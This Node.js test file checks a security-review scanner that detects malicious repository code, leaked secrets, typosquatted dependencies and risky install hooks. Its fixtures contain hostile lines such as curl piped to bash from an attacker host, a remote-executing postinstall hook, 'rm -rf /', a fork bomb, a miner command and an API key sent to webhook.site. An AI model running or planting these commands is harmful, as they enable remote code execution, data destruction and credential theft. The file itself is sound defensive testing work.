import test from 'node:test';
import assert from 'node:assert/strict';
import {
  analyzeDependencies,
  analyzePackageManifest,
  classifyRiskLevel,
  composeVerdict,
  extractExternalHosts,
  findTyposquatCandidates,
  isDefiniteMalice,
  levenshtein,
  llmReview,
  privacyFindings,
  scanObfuscation,
  scanPaths,
  scanSecrets,
  scanSecurity,
} from './security-review.mjs';

// --- scanSecurity：恶意样本命中 ---

test('detects curl|sh remote execution with evidence', () => {
  const text = `#!/bin/sh
echo "installing"
curl -sSL https://evil.example/x.sh | bash`;
  const findings = scanSecurity(text, { file: 'setup.sh' });
  const remote = findings.find((f) => f.id === 'remote-exec');
  assert.ok(remote, '应命中 remote-exec');
  assert.equal(remote.severity, 'critical');
  assert.equal(remote.file, 'setup.sh');
  assert.equal(remote.line, 3);
  assert.match(remote.snippet, /curl/);
});

test('does not flag plain curl usage', () => {
  const text = 'curl --version\ncurl -sSfL https://example.com/file.tar.gz -o /tmp/f\n';
  const findings = scanSecurity(text, { file: 'ok.sh' });
  assert.ok(!findings.some((f) => f.id === 'remote-exec'));
});

test('detects PowerShell encoded command', () => {
  const findings = scanSecurity('powershell -enc SQBFAFgA', { file: 'a.ps1' });
  assert.ok(findings.some((f) => f.id === 'encoded-command'));
});

test('detects Invoke-Expression and iex', () => {
  assert.ok(scanSecurity('Invoke-Expression $code', { file: 'a.ps1' }).some((f) => f.id === 'invoke-expression'));
  assert.ok(scanSecurity('iex $payload', { file: 'b.ps1' }).some((f) => f.id === 'iex-short' && f.severity === 'warning'));
});

test('detects child_process shell execution', () => {
  const findings = scanSecurity("const { execSync } = require('node:child_process');\nexecSync('whoami');", { file: 'x.js' });
  const shell = findings.find((f) => f.id === 'shell-exec');
  assert.ok(shell, '应命中 shell-exec');
  assert.equal(shell.severity, 'critical');
});

test('detects decoded-code execution on one line', () => {
  const text = 'eval(atob("dmFyIHg9MTs="));';
  const findings = scanSecurity(text, { file: 'y.js' });
  assert.ok(findings.some((f) => f.id === 'decode-exec' && f.severity === 'critical'), '应命中 decode-exec');
});

test('detects remote dynamic import', () => {
  const findings = scanSecurity('const m = await import("https://evil.example/a.mjs");', { file: 'z.mjs' });
  assert.ok(findings.some((f) => f.id === 'remote-code-import' && f.severity === 'critical'));
});

test('destructive rm -rf only flags root/home, not node_modules', () => {
  assert.ok(scanSecurity('rm -rf / && echo bye', { file: 'a.sh' }).some((f) => f.id === 'destructive'));
  assert.ok(scanSecurity('rm -rf ~', { file: 'b.sh' }).some((f) => f.id === 'destructive'));
  const safe = 'rm -rf ./node_modules dist\nrm -rf /var/lib/apt/lists/*\n';
  assert.ok(!scanSecurity(safe, { file: 'c.sh' }).some((f) => f.id === 'destructive'), '清理类 rm -rf 不应命中');
});

test('detects exfiltration endpoints', () => {
  const findings = scanSecurity('await fetch("https://webhook.site/abc")', { file: 'n.js' });
  assert.ok(findings.some((f) => f.id === 'exfil-endpoint' && f.severity === 'critical'));
});

test('allowlists wss to official endpoints', () => {
  const findings = scanSecurity('const ws = new WebSocket("wss://api.deepseek.com/v1");', { file: 'w.js' });
  assert.ok(!findings.some((f) => f.id === 'websocket-exfil'));
});

test('flags WebSocket to unknown host', () => {
  const findings = scanSecurity('new WebSocket("wss://telemetry.example.com/collect")', { file: 'w.js' });
  assert.ok(findings.some((f) => f.id === 'websocket-exfil' && f.severity === 'critical'));
});

test('detects crypto mining and fork bomb markers', () => {
  assert.ok(scanSecurity('xmrig -o stratum+tcp://pool:3333', { file: 'm.sh' }).some((f) => f.id === 'crypto-mining'));
  assert.ok(scanSecurity(':(){ :|:& };:', { file: 'f.sh' }).some((f) => f.id === 'fork-bomb'));
});

// --- scanSecrets ---

test('detects hardcoded sk- key but skips placeholders', () => {
  const evil = 'const KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz12";';
  assert.ok(scanSecrets(evil, { file: 'k.js' }).some((f) => f.id === 'secret-sk' && f.severity === 'critical'));
  const fake = 'token: "sk-your-api-key-here"';
  assert.ok(!scanSecrets(fake, { file: 'k2.js' }).some((f) => f.id === 'secret-sk'));
});

test('detects private key blocks and AWS keys', () => {
  const pem = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...';
  assert.ok(scanSecrets(pem, { file: 'p.pem' }).some((f) => f.id === 'secret-private-key'));
  assert.ok(scanSecrets('AKIAIOSFODNN7EXAMPLE', { file: 'a.txt' }).some((f) => f.id === 'secret-aws'));
});

// --- scanObfuscation ---

test('flags long base64 blobs and escaped runs', () => {
  const blob = `const payload = "${'A'.repeat(120)}";`;
  assert.ok(scanObfuscation(blob, { file: 'b.js' }).some((f) => f.id === 'obfuscation'));
  const hex = 'const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64";';
  assert.ok(scanObfuscation(hex, { file: 'h.js' }).some((f) => f.id === 'hex-encoded'));
  assert.ok(scanObfuscation('String.fromCharCode(104,101,108,108,111)', { file: 'c.js' }).some((f) => f.id === 'char-code'));
});

// --- privacyFindings / external hosts ---

test('combines env credential read with network send in same file', () => {
  const text = `const key = process.env.OPENAI_API_KEY;\nfetch("https://webhook.site/abc", { body: key });`;
  const notes = privacyFindings(text, { file: 'p.js' });
  assert.ok(notes.some((n) => n.severity === 'critical' && /凭据类环境变量/.test(n.explanation)));
});

test('env-only read is a warning, not critical', () => {
  const notes = privacyFindings('const dir = process.env.HOME;', { file: 'e.js' });
  assert.ok(notes.some((n) => n.severity === 'warning' && /读取环境变量/.test(n.explanation)));
  assert.ok(!notes.some((n) => n.severity === 'critical'));
});

test('extractExternalHosts drops allowlisted domains and www prefix', () => {
  const hosts = extractExternalHosts(
    'https://github.com/a/b https://www.example.com/x https://evil.example.com/y',
  );
  assert.ok(!hosts.includes('github.com'));
  assert.ok(hosts.includes('example.com'));
  assert.ok(hosts.includes('evil.example.com'));
});

test('extractExternalHosts ignores localhost and IP literals', () => {
  const hosts = extractExternalHosts(
    'http://127.0.0.1:3456/health http://localhost:8080 http://10.0.0.2/ping https://api.real.com/v1',
  );
  assert.ok(!hosts.includes('127.0.0.1'));
  assert.ok(!hosts.includes('localhost'));
  assert.ok(!hosts.includes('10.0.0.2'));
  assert.ok(hosts.includes('api.real.com'));
});

test('scanPaths flags only double-extension disguise files', () => {
  const hits = scanPaths([
    'src/index.js',
    'install.sh',
    'dist/app/installer.msi', // 单一扩展名的安装器是正常形态
    'assets/logo.png.exe', // 双重扩展名伪装
    'node_modules/x/payload.js.bat',
    'tools/setup.cmd', // 命令行脚本属正常形态
  ]);
  assert.equal(hits.length, 2);
  assert.ok(hits.every((h) => h.id === 'suspicious-extension' && h.severity === 'warning'));
  assert.ok(hits.some((h) => h.file === 'assets/logo.png.exe'));
  assert.ok(hits.some((h) => h.file === 'node_modules/x/payload.js.bat'));
});

// --- 包生命周期与供应链 ---

test('flags remote-executing postinstall script as critical', () => {
  const pkg = { name: 'p', scripts: { postinstall: 'curl -sSL https://evil.example/x | sh' } };
  const findings = analyzePackageManifest(pkg, { file: 'package.json' });
  assert.ok(findings.some((f) => f.id === 'lifecycle-postinstall-remote-exec' && f.severity === 'critical'));
});

test('flags plain lifecycle script as warning', () => {
  const pkg = { name: 'p', scripts: { postinstall: 'node scripts/postinstall.mjs' } };
  const findings = analyzePackageManifest(pkg, { file: 'package.json' });
  assert.ok(findings.some((f) => f.id === 'lifecycle-postinstall' && f.severity === 'warning'));
});

test('detects typosquat candidates but not exact names', () => {
  const pkg = { name: 'x', dependencies: { exprses: '^1.0.0', express: '^5.0.0', lodash: '^4.17.21' } };
  const cands = findTyposquatCandidates(pkg);
  assert.ok(cands.some((c) => c.name === 'exprses' && c.closeTo === 'express'));
  assert.ok(!cands.some((c) => c.name === 'express' || c.name === 'lodash'));
});

test('typosquat ignores short or non-suspicious names', () => {
  const pkg = {
    name: 'x',
    dependencies: {
      '@opentelemetry/api': '^1.0.0',
      '@astrojs/rss': '^4.0.0',
      '@open-design/web': '^0.1.0',
      ws: '^8.0.0',
      axios: '^1.7.0',
    },
  };
  assert.deepEqual(findTyposquatCandidates(pkg), [], '短名/知名名不应被误报为仿冒');
  // 更长名称仍能命中（阈值随长度放宽）。
  const longer = { name: 'y', dependencies: { lodahs: '^4.0.0', exprees: '^5.0.0' } };
  const longerCands = findTyposquatCandidates(longer);
  assert.ok(longerCands.some((c) => c.name === 'lodahs'));
  assert.ok(longerCands.some((c) => c.name === 'exprees'));
});

test('levenshtein distance', () => {
  assert.equal(levenshtein('exprses', 'express'), 1);
  assert.equal(levenshtein('express', 'express'), 0);
  assert.equal(levenshtein('', 'abc'), 3);
});

test('OSV query builds batch and fails open without network', async () => {
  const pkgs = [{ name: 'x', dependencies: { axios: '^1.7.0' } }];
  let called = false;
  const fakeFetch = async () => {
    called = true;
    return { ok: true, json: async () => ({ results: [{ vulns: [{ id: 'OSV-2024-1' }] }] }) };
  };
  const res = await analyzeDependencies(pkgs, { osvCheck: true, fetchImpl: fakeFetch, log: { warn() {} } });
  assert.ok(called);
  assert.equal(res.status, 'ok');
  assert.ok(res.findings.some((f) => f.id === 'osv-vuln' && /axios/.test(f.explanation)));

  const failed = await analyzeDependencies(pkgs, {
    osvCheck: true,
    fetchImpl: async () => {
      throw new Error('network down');
    },
    log: { warn() {} },
    retryDelayMs: 0,
  });
  assert.equal(failed.status, 'failed');
  assert.deepEqual(failed.findings, []);
});

test('OSV retries transient failures once and succeeds', async () => {
  const pkgs = [{ name: 'x', dependencies: { axios: '^1.7.0' } }];
  let attempts = 0;
  const fakeFetch = async () => {
    attempts += 1;
    if (attempts === 1) throw new Error('transient network error');
    return { ok: true, json: async () => ({ results: [{ vulns: [{ id: 'OSV-2024-9' }] }] }) };
  };
  const res = await analyzeDependencies(pkgs, {
    osvCheck: true,
    fetchImpl: fakeFetch,
    log: { warn() {} },
    retryDelayMs: 0,
  });
  assert.equal(attempts, 2, '应以一次重试成功');
  assert.equal(res.status, 'ok');
  assert.ok(res.findings.some((f) => f.id === 'osv-vuln'));
});

// --- composeVerdict / 分级 ---

test('composeVerdict: definite-malice critical blocks, gray-zone critical flags', () => {
  // 确定恶意（remote-exec 等）-> blocked。
  assert.equal(
    composeVerdict({ findings: [{ id: 'remote-exec', severity: 'critical' }] }).verdict,
    'blocked',
  );
  assert.ok(
    composeVerdict({ findings: [{ id: 'lifecycle-postinstall-remote-exec', severity: 'critical' }] }).verdict,
    'blocked',
    'lifecycle-*-remote-exec 也应阻断',
  );
  // 灰区高风险（无确定恶意 id 的 critical，如读取凭据类环境变量并外发）-> flagged 收录。
  assert.equal(
    composeVerdict({ findings: [{ id: 'eval-exec', severity: 'critical' }] }).verdict,
    'flagged',
  );
  // 隐私「读取本地凭据文件」无 id，按文案判定为确定恶意。
  assert.equal(
    composeVerdict({ findings: [], privacyNotes: [{ severity: 'critical', explanation: '读取本地凭据文件（如 .ssh/.aws/.npmrc）' }] }).verdict,
    'blocked',
  );
  // 隐私「读取凭据类环境变量并发送到网络」按文案判定为灰区高风险 -> flagged。
  assert.equal(
    composeVerdict({ findings: [], privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络，可能泄露密钥' }] }).verdict,
    'flagged',
  );
  // warning -> flagged；干净 -> approved。
  assert.equal(composeVerdict({ findings: [{ severity: 'warning' }], privacyNotes: [] }).verdict, 'flagged');
  assert.equal(composeVerdict({ findings: [], privacyNotes: [] }).verdict, 'approved');
});

test('isDefiniteMalice: id-based and lifecycle and privacy-text classification', () => {
  assert.equal(isDefiniteMalice({ id: 'crypto-mining' }), true);
  assert.equal(isDefiniteMalice({ id: 'lifecycle-prepare-remote-exec' }), true);
  assert.equal(isDefiniteMalice({ id: 'lifecycle-postinstall-destructive' }), true);
  assert.equal(isDefiniteMalice({ id: 'screen-capture' }), false, '屏幕采集归灰区');
  assert.equal(isDefiniteMalice({ id: 'eval-exec' }), false, 'eval 归灰区');
  assert.equal(isDefiniteMalice({ severity: 'critical', explanation: '读取本地凭据文件（如 .ssh/.aws/.npmrc）' }), true);
  assert.equal(isDefiniteMalice({ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络' }), false);
});

test('classifyRiskLevel: high for critical, moderate for warning, low for clean', () => {
  assert.equal(
    classifyRiskLevel({ findings: [{ id: 'env-exfil', severity: 'critical' }] }).risk_level,
    'high',
  );
  assert.equal(
    classifyRiskLevel({ findings: [{ severity: 'warning', id: 'base64' }] }).risk_level,
    'moderate',
  );
  assert.equal(classifyRiskLevel({ findings: [], privacyNotes: [] }).risk_level, 'low');
  const high = classifyRiskLevel({ privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络' }] });
  assert.equal(high.risk_level, 'high');
  assert.ok(high.risk_notes.some((n) => /自行审计/.test(n)), '灰区风险应标注「请自行审计」');
});

test('classifyRiskLevel: risk_evidence carries file:line location, degrades gracefully', () => {
  const findings = [
    { id: 'eval-exec', severity: 'critical', explanation: '使用动态代码执行（eval/new Function）', file: 'src/index.js', line: 42 },
    { id: 'base64', severity: 'warning', explanation: '存在 Base64 解码行为', file: 'lib/a.js', line: 7 },
  ];
  const high = classifyRiskLevel({ findings, privacyNotes: [] });
  assert.equal(high.risk_level, 'high');
  assert.ok(high.risk_evidence.some((e) => e.file === 'src/index.js' && e.line === 42), '应带文件:行号');
  assert.ok(high.risk_notes.some((n) => /src\/index\.js:42/.test(n)), 'risk_notes 应内联位置');

  // 无行号（隐私 note）降级为只带文件。
  const noLine = classifyRiskLevel({
    findings: [],
    privacyNotes: [{ severity: 'critical', explanation: '读取凭据类环境变量并发送到网络，可能泄露密钥', file: 'p.js' }],
  });
  assert.equal(noLine.risk_level, 'high');
  assert.ok(noLine.risk_evidence.some((e) => e.file === 'p.js' && e.line === undefined));
  assert.ok(noLine.risk_notes.some((n) => /p\.js/.test(n)));

  // 无文件无行号（OSV 依赖漏洞）不丢风险，只保留说明。
  const depOnly = classifyRiskLevel({
    findings: [{ id: 'osv-vuln', severity: 'warning', explanation: '依赖 axios@1.7.0 存在已知漏洞', file: '<dependencies>', line: 0 }],
    privacyNotes: [],
  });
  assert.equal(depOnly.risk_level, 'moderate');
  assert.equal(depOnly.risk_evidence.length, 1);
  assert.equal(depOnly.risk_evidence[0].file, '<dependencies>');
  assert.equal(depOnly.risk_evidence[0].line, undefined, 'line=0 视为无真实行号，不作为定位');
});

// --- llmReview ---

test('llmReview skips when no key, returns error on failure', async () => {
  const skipped = await llmReview({}, { apiKey: '', fetchImpl: async () => ({ ok: true }) });
  assert.equal(skipped.status, 'skipped');

  const errored = await llmReview(
    { repo: 'a/b', verdict: 'approved', findings: [], externalHosts: [], packageSummary: [], samples: [] },
    {
      apiKey: 'x',
      fetchImpl: async () => {
        throw new Error('boom');
      },
    },
  );
  assert.equal(errored.status, 'error');

  const ok = await llmReview(
    { repo: 'a/b', verdict: 'approved', findings: [], externalHosts: [], packageSummary: [], samples: [] },
    {
      apiKey: 'x',
      fetchImpl: async () => ({
        ok: true,
        json: async () => ({
          choices: [{ message: { content: JSON.stringify({ escalation: 'warning', additionalFindings: [], rationale: 'checked' }) } }],
        }),
      }),
    },
  );
  assert.equal(ok.status, 'ok');
  assert.equal(ok.verdict, 'warning');
});